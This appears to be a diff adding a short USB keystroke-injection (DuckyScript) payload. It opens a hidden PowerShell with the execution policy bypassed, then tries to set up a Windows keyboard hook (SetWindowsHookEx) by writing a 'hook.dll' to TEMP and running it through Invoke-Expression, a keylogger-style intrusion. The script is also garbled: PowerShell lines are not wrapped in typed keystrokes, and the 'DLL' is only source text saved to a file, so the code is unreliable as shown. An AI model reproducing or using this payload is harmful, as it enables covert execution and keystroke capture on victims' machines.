@@ -1,0 +1,18 @@
+DELAY 1000
+GUI r
+DELAY 200
+STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass
+ENTER
+DELAY 1000
+REM Hooking
+$string = @"
+`$hookCode = @"
+`[DllImport("user32.dll")]
+public static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);
+"@
+`$bytes = [System.Text.Encoding]::UTF8.GetBytes($hookCode)
+`$bytes | Out-File -FilePath "$env:TEMP\hook.dll" -Encoding Byte
+"@
+ENTER
+DELAY 500
+STRING $string | Invoke-Expression
